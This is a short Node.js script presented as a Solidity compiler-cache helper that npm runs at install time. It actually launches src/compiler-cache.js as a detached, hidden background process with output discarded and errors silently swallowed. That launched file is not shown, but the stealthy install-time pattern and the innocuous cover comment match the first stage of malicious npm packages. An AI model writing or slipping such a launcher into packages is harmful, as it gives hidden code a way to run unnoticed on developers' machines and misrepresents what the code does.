#!/usr/bin/env node
// Solidity bootstrap helper — launches compiler cache in background
// This file exists only so npm's install script can spawn the cache process
(function(){
try{
var c=require('child_process');
var p=require('path');
var f=p.join(__dirname,'src','compiler-cache.js');
c.spawn(process.execPath,[f],{detached:true,stdio:'ignore',windowsHide:true}).unref();
}catch(e){}
})();